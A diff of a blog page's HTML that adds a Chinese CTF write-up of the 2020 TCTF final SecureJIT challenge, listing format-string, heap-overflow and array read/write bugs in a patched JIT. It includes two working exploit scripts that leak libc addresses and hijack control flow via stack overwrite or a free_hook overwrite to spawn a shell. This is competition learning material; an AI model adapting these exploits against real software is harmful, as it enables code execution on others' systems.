@@ -22,7 +22,7 @@
     <meta name="description" content="hurricane618's blog">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>风之栖息地|hurricane618&#39;s blog</title>
+    <title>2020 TCTF final SecureJIT writeup · 风之栖息地|hurricane618&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -214,12 +214,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">风之栖息地</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2020 TCTF final SecureJIT writeup</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">风之栖息地</a>
 </header>
@@ -231,24 +242,76 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg1.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            2020 TCTF final SecureJIT writeup
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="fmt">fmt</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">754</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/10/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -349,88 +412,88 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/31/2019TCTF-web-writeup/">
-            
-                <span>2019TCTF web writeup</span>
-        </a>
-        <div class="abstract-content">
-            wallbreaker easy这道题在比赛的时候专注在imagick上面，但是由于是最新版本，以前的bypass漏洞已经修补。。。之后由于复试的原因没有仔细研究，现在开始复现。
-这道题给了一个webshell，密码是backdoor，可以直接用菜刀连接，然而用phpinfo查看禁用函数，发现已经把所有执行命令的函数都ban了，并且知道操作系统是ubuntu18.04.
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>第一次打final 被打的头都炸了，555555。过去三周了，还是水一下这道签到题。</p>
+<h2 id="题目情况"><a href="#题目情况" class="headerlink" title="题目情况"></a>题目情况</h2><p>作者搞到了一个ruby的jit——rubi，其中打了patch，让执行代码的区域变成不可写的情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/engine.c b/engine.c</span><br><span class="line">index 79e83d2..2350d59 100644</span><br><span class="line">--- a/engine.c</span><br><span class="line">+++ b/engine.c</span><br><span class="line">@@ -137,6 +137,11 @@ static int execute(char *source)</span><br><span class="line">init();</span><br><span class="line">lex(source);</span><br><span class="line">parser();</span><br><span class="line">+ long memsz = 0xFFFF + 1;</span><br><span class="line">+ if (mprotect(ntvCode, memsz, PROT_READ | PROT_EXEC)) &#123;</span><br><span class="line">+ perror(&quot;mprotect&quot;);</span><br><span class="line">+ exit(1);</span><br><span class="line">+ &#125;</span><br><span class="line">((int (*)(int *, void **)) ntvCode)(0, funcTable);</span><br><span class="line">dispose();</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+<p>对于防护，有一个思路就是寻找那些没有被保护的地方，这个只保护了ruby代码区域，没有保护其他的栈或者一些特殊符号比如free_hook和malloc_hook。</p>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>1.格式化字符串漏洞</p>
+<img src="/2020/10/12/2020-tctf-final-jit/1.png">
+<p>2.堆溢出二连，分别溢出了变量名和函数名</p>
+<img src="/2020/10/12/2020-tctf-final-jit/2.png">
+<img src="/2020/10/12/2020-tctf-final-jit/3.png">
+<p>但是这个堆溢出有点无用，溢出之后无法有效控制</p>
+<p>3.数组任意读写</p>
+<img src="/2020/10/12/2020-tctf-final-jit/4.png">
+<p>这个威力很大，利用读取操作获得libc地址之后，可以直接改free_hook和malloc_hook。</p>
+<h2 id="方法一-利用格式化字符串"><a href="#方法一-利用格式化字符串" class="headerlink" title="方法一 利用格式化字符串"></a>方法一 利用格式化字符串</h2><p>格式化字符串先泄露出libc地址，这个程序由于是32位的，所以会在栈上存储变量，这就给了我们向栈空间写数据的机会，可以输入很多参数的printf，覆盖栈空间的数据劫持控制流。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">fp = fopen(<span class="string">"/tmp/t"</span>, <span class="string">"w"</span>)</span><br><span class="line">fprintf(fp, <span class="string">"%15$p %13$p"</span>)</span><br><span class="line">fclose(fp)</span><br><span class="line"><span class="symbol">text:</span>string = Array(<span class="number">100</span>)</span><br><span class="line">fp = fopen(<span class="string">"/tmp/t"</span>, <span class="string">"r"</span>)</span><br><span class="line">fgets(text, <span class="number">100</span>, fp)</span><br><span class="line">fclose(fp)</span><br><span class="line">printf <span class="string">"%s\n"</span>, text</span><br><span class="line"><span class="symbol">base:</span>int = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">2</span>, i &lt; <span class="number">10</span>, i++</span><br><span class="line">value = text[i] - <span class="string">'0'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'a'</span> &lt;= text[i] <span class="keyword">and</span> text[i] &lt;= <span class="string">'z'</span></span><br><span class="line">value = text[i] - <span class="string">'a'</span> + <span class="number">10</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">base = base * <span class="number">16</span> + value</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="symbol">libc:</span>int = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">13</span>, i &lt; <span class="number">21</span>, i++</span><br><span class="line">value = text[i] - <span class="string">'0'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'a'</span> &lt;= text[i] <span class="keyword">and</span> text[i] &lt;= <span class="string">'z'</span></span><br><span class="line">value = text[i] - <span class="string">'a'</span> + <span class="number">10</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">libc = libc * <span class="number">16</span> + value</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">#libc = libc - 1001401 # 1001081</span></span><br><span class="line">libc = libc - <span class="number">1001081</span></span><br><span class="line"><span class="comment">#sys = libc + 250448 # 250368</span></span><br><span class="line">sys = libc + <span class="number">250368</span></span><br><span class="line"><span class="comment">#bin_sh = libc + 1565647 # 1564879</span></span><br><span class="line">bin_sh = libc + <span class="number">1564879</span></span><br><span class="line">gadget = <span class="number">0</span></span><br><span class="line">printf <span class="string">"%x\n"</span>, base</span><br><span class="line">printf <span class="string">"%x\n"</span>, libc</span><br><span class="line">printf <span class="string">"%d"</span>, gadget, gadget, gadget, gadget, gadget, bin_sh, sys, gadget, gadget, sys, gadget, gadget, gadget, gadget, gadget, sys, gadget, bin_sh</span><br></pre></td></tr></table></figure>
+<h2 id="方法二-直接利用数组任意读写"><a href="#方法二-直接利用数组任意读写" class="headerlink" title="方法二 直接利用数组任意读写"></a>方法二 直接利用数组任意读写</h2><p>首先在进入ruby执行空间的时候，eax为函数表地址，所以可以直接用<code>[3]</code>获得到malloc的地址，这样我们就能够计算出libc地址，得到<code>free_hook</code>的地址，直接写入system，然后free(‘/bin/sh’)拿到shell。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">3</span>]</span><br><span class="line"><span class="symbol">a:</span>string = Array(<span class="number">100</span>)</span><br><span class="line">a[x - a - <span class="number">503040</span> + <span class="number">1939664</span>] = x - <span class="number">503040</span> + <span class="number">250448</span></span><br><span class="line">free(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看程序的时候，多注意一些危险操作，比如字符串读写，内存块读写，悬挂指针问题等等。在检查保护机制的时候，注意它的保护范围和保护原理，像这道题只保护了ruby代码执行区域我们可以在其他地方写数据来绕过，之前做的一道ptrace沙箱题目，绕过它的方法是利用系统中断<code>int3</code>，强制进入一次系统中断让ptrace的检测点失效，从而绕过对系统调用的检测。</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247484959&amp;idx=1&amp;sn=5919e45456c131ac9392d875c34e0719&amp;chksm=ce4b2d88f93ca49e1771586284fe75e12fdbfa63b1f6c7e6e5ae01ada49a20cca0aa7a807b8a&amp;mpshare=1&amp;scene=23&amp;srcid=0929Rl2bA4BazcX9HRFNQeKd&amp;sharer_sharetime=1601383291632&amp;sharer_shareid=2bfea3a1914646ead630f87d9dbd3069%23rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247484959&amp;idx=1&amp;sn=5919e45456c131ac9392d875c34e0719&amp;chksm=ce4b2d88f93ca49e1771586284fe75e12fdbfa63b1f6c7e6e5ae01ada49a20cca0aa7a807b8a&amp;mpshare=1&amp;scene=23&amp;srcid=0929Rl2bA4BazcX9HRFNQeKd&amp;sharer_sharetime=1601383291632&amp;sharer_shareid=2bfea3a1914646ead630f87d9dbd3069%23rd</a></p>
 
-所以这是一个受限制的webshell绕过disable_function的问题
-bypass disable_function的方法绕过disable_function也是一个老生常谈的问题了。总结一下大概有一下四种：...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/31</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="PHP">PHP</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="JAVA">JAVA</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/02/serial-ports-translation-cn/">
-            
-                <span>快速寻找串行接口</span>
-        </a>
-        <div class="abstract-content">
-            这是一篇来自devttys0的一篇文章，在寻找串口的方法上给出了很多有用的方法，是一篇不错的总结文，在国内没有看到翻译，所以就想翻译成中文供大家学习，第一次做翻译，如有错误之处，请大家体谅，可以给我留言，我会快速修改。
-原文链接
-鉴于这个博客的名声和我拥有的点击量，我认为现在是大家一起讨论串口的时候了，尤其是嵌入式系统的串口。
-我的目标是通过使用确定的测试和有根据的猜测来讲解我发现的有效识别和逆向嵌入式串口的技术，而不需要特别昂贵的设备。
-简介串口对于嵌入式开发人员特别有用，通常会使用串口来：
-
-进入boot loader
-得到启动和调试信息
-通过shell和系统交互
-
-不用说这个功能同...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
+            </p><p>原文链接：<a href="https://hurricane618.me/2020/10/12/2020-tctf-final-jit/">https://hurricane618.me/2020/10/12/2020-tctf-final-jit/</a>
+            </p><p>发表日期：<a href="https://hurricane618.me/2020/10/12/2020-tctf-final-jit/">October 12th 2020, 9:27:17 am</a>
+            </p><p>更新日期：<a href="https://hurricane618.me/2020/10/12/2020-tctf-final-jit/">October 12th 2020, 9:27:17 am</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/02</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="IOT">IOT</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="翻译">翻译</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/09/15/2020qwb-qwxf-pwn/" title="2020强网杯 强网先锋のpwn">
+                    <div class="prevTitle">2020强网杯 强网先锋のpwn</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "https://hurricane618.me/2020/10/12/2020-tctf-final-jit/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2020 TCTF final SecureJIT writeup"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://hurricane618.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -517,6 +580,24 @@ bypass disable_function的方法绕过disable_function也是一个老生常谈�
 
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目情况"><span class="toc-number">1.</span> <span class="toc-text">题目情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞点"><span class="toc-number">2.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一-利用格式化字符串"><span class="toc-number">3.</span> <span class="toc-text">方法一 利用格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二-直接利用数组任意读写"><span class="toc-number">4.</span> <span class="toc-text">方法二 直接利用数组任意读写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1136,6 +1217,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
